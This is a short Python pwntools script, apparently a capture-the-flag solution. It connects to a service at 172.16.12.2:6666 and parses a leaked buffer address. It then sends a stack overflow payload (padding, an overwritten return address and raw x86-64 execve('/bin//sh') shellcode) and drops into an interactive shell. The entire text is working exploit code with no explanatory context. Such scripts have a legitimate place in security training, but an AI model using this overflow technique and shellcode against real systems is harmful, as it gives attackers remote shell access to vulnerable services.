from pwn import *
#p = process('./pwn')
p = remote("172.16.12.2",6666)
p.recvuntil("[")
buf_addr = p.recvuntil(']', drop=True)
success("buf_addr: " + buf_addr)
shell=b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.sendline(b'a'*24 + p64(int(buf_addr,16)+32) + shell)
p.interactive()